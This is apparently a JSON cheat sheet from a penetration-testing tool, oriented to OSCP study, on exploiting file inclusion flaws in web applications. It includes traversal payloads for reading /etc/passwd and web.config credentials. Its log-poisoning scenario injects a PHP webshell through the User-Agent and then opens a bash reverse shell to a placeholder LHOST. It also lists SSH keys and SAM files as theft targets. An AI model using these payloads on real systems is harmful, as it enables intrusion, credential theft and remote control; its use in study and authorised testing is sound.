{
  "cheatsheets": [
    {
      "id": "rfi-lfi-evaluation",
      "name": "RFI/LFI Evaluation",
      "description": "Test and exploit Remote/Local File Inclusion vulnerabilities in web applications",
      "educational_header": {
        "how_to_recognize": [
          "URL parameters referencing files: ?page=home.php, ?file=about.html, ?template=header",
          "Error messages revealing file paths: Warning: include(/var/www/html/...)",
          "Template engines or CMS with dynamic page loading (PHP, JSP, ASP)",
          "Parameters containing file extensions: .php, .html, .txt, .inc in GET/POST data",
          "Directory traversal patterns in URLs: ../../../, ..\\..\\..\\",
          "Wrapper protocols in parameters: file://, php://, data://, http://"
        ],
        "when_to_look_for": [
          "After directory enumeration reveals PHP/JSP/ASP applications",
          "When viewing page source shows include() or require() patterns",
          "During parameter fuzzing - test file, page, template, doc, path parameters",
          "In custom CMSs or old frameworks (WordPress < 4.7, Joomla < 3.4.5, old PHP apps)",
          "When error messages leak filesystem information",
          "After finding upload functionality that might combine with LFI for RCE"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Linux Web Server - /etc/passwd Retrieval via LFI",
          "context": "Target: Apache 2.4.41 running PHP 7.2 on Ubuntu 18.04. Gobuster found /dashboard.php?page=home. Application uses include($_GET['page']) without sanitization. Goal: Confirm LFI and enumerate system users.",
          "approach": "Test if 'page' parameter loads files directly. Try path traversal (../) to escape web root and access /etc/passwd. Start with 3 levels (../../../etc/passwd), increase if needed. If successful, enumerate: /etc/shadow (requires www-data compromise), /etc/hosts (network info), /var/www/html/config.php (credentials).",
          "commands": [
            "lfi-test"
          ],
          "expected_outcome": "LFI confirmed if you see: root:x:0:0:root:/root:/bin/bash, daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin, www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin. Next steps: Test for log poisoning (User-Agent injection), check for writable log files (/var/log/apache2/access.log), attempt PHP wrapper exploitation (php://filter).",
          "why_this_works": "PHP include() without sanitization allows directory traversal. The ../ sequence escapes web root (/var/www/html) to access system files. Each ../ moves up one directory level. Three levels usually suffice for typical Apache setups (/var/www/html -> /var/www -> /var -> / ). /etc/passwd is world-readable, making it the ideal test target."
        },
        {
          "title": "Scenario 2: Windows IIS - Configuration File Extraction",
          "context": "Target: IIS 8.5 with ASP.NET application on Windows Server 2016. Parameter: ?template=default.aspx. Application uses Server.Execute() for template rendering. Goal: Extract database credentials from web.config.",
          "approach": "Try Windows paths with backslashes: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts (confirms traversal). Then target web.config at application root: ..\\web.config or ..\\..\\web.config. Alternative targets: ..\\bin\\config (binaries), ..\\App_Data\\ (database files), ..\\logs\\ (log files with sensitive data).",
          "commands": [
            "curl-post"
          ],
          "expected_outcome": "Successful extraction shows: <connectionStrings><add name=\"DefaultConnection\" connectionString=\"Server=MSSQLSERVER;Database=webapp;User Id=sa;Password=P@ssw0rd123;\"/>. Use credentials for: Direct database access (sqlmap, mssql-cli), Lateral movement (password reuse), Privilege escalation (sa account = admin).",
          "why_this_works": "ASP.NET applications store sensitive configuration in web.config at application root. Unlike Linux, Windows uses backslashes (\\) for paths. IIS applications often run under high-privilege accounts (ApplicationPoolIdentity, NETWORK SERVICE), granting access to sensitive files. Server.Execute() and Response.WriteFile() are common vulnerable functions."
        },
        {
          "title": "Scenario 3: PHP Wrappers - RCE via Log Poisoning",
          "context": "Target: Apache 2.4 + PHP 5.6 (allow_url_include=Off, so no RFI). LFI confirmed via ?page= parameter. Apache logs located at /var/log/apache2/access.log (world-readable on misconfigured systems). Goal: Achieve RCE through log poisoning.",
          "approach": "Step 1: Verify log accessibility via LFI: ?page=../../../../var/log/apache2/access.log. Step 2: Poison logs with PHP code in User-Agent: curl -A '<?php system($_GET[\"c\"]); ?>' http://target/. Step 3: Trigger execution: ?page=../../../../var/log/apache2/access.log&c=whoami. Step 4: Upgrade to reverse shell: c=bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'.",
          "commands": [
            "curl-post"
          ],
          "expected_outcome": "First request shows log contents with poisoned User-Agent. Second request with &c=whoami returns www-data. Third request establishes reverse shell. Alternative targets if access.log fails: /var/log/auth.log (SSH login attempts), /proc/self/environ (environment variables), PHP session files (/var/lib/php/sessions/sess_SESSIONID).",
          "why_this_works": "Apache logs user input (User-Agent, Referer) without sanitization. When LFI includes the log file, PHP parses and executes embedded code. This converts read-only LFI into RCE. Requirements: LFI vulnerability, log file readable by web user (www-data), PHP code execution not disabled (disable_functions). Fallback if logs inaccessible: PHP session poisoning (requires valid session), /proc/self/environ (requires /proc filesystem), data:// wrapper (requires allow_url_include=On)."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Detection & Verification",
          "notes": "Confirm LFI/RFI exists before investing time in exploitation. Test with safe, world-readable files first (/etc/passwd on Linux, C:\\windows\\system32\\drivers\\etc\\hosts on Windows). Document the number of ../ sequences needed (usually 3-5 for web root escape).",
          "commands": [
            {
              "id": "lfi-test",
              "example": "../../../../../../etc/passwd",
              "shows": "root:x:0:0"
            },
            {
              "id": "curl-post",
              "example": "curl -X POST -d 'username=admin' http://192.168.1.100/login.php",
              "shows": "200 OK"
            }
          ]
        },
        {
          "title": "Phase 2: Information Gathering",
          "notes": "Extract sensitive files to find credentials, API keys, source code, or further vulnerabilities. Priority targets: Linux (/etc/passwd, /var/www/html/config.php, ~/.bash_history, ~/.ssh/id_rsa), Windows (web.config, unattend.xml, SAM/SYSTEM via Volume Shadow Copies). Document all findings for reporting and privilege escalation.",
          "commands": [
            {
              "id": "curl-post",
              "example": "curl -X POST -d 'username=admin' http://192.168.1.100/login.php",
              "shows": "200 OK"
            }
          ]
        },
        {
          "title": "Phase 3: Exploitation (RCE Upgrade)",
          "notes": "Upgrade read-only LFI to RCE via: 1) Log poisoning (inject PHP in User-Agent, include log file), 2) PHP wrappers (data://, expect://, php://input), 3) Session poisoning (PHPSESSID file inclusion), 4) /proc/self/environ (inject into PATH), 5) File upload + LFI combo (upload PHP shell, include via LFI). Test in order of decreasing reliability.",
          "commands": [
            {
              "id": "curl-post",
              "example": "curl -X POST -d 'username=admin' http://192.168.1.100/login.php",
              "shows": "200 OK"
            }
          ]
        }
      ],
      "tags": [
        "WEB",
        "OSCP:HIGH",
        "QUICK_WIN",
        "FILE_INCLUSION",
        "LFI",
        "RFI",
        "PHP"
      ]
    }
  ]
}